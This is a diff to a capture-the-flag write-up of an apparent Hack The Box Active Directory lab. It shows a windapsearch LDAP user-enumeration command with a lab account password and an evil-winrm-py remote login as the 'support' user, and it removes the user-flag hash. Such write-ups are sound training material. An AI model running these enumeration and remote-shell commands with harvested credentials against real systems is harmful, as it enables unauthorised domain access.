@@ -140,7 +140,8 @@ nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
 With a technical `ldap` account already known (identified via anonymous LDAP / the challenge context), the domain's user list is extracted:
 
 ```bash
-windapsearch -d support.htb --dc "10.129.230.181" -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --module users \
+windapsearch -d support.htb --dc "10.129.230.181" -u 'ldap'  \
+-p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --module users \
  | grep "sAMAccountName" | awk -F ': ' '{print $2}' > users.txt
 ```
 
@@ -187,7 +188,8 @@ WinRM connection with the `support` account:
 evil-winrm-py --ip 10.129.230.181 --user support -p 'Ironside47pleasure40Watchful'
 ```
 
-```
+```powershell
+evil-winrm-py PS C:\Users\support\Documents> whoami
 support\support
 ```
 
@@ -195,7 +197,6 @@ The user flag is retrieved from the desktop:
 
 ```
 C:\Users\support\Desktop\user.txt
-a735ce438d352dd31819ce17ed76973b
 ```
 
 ---
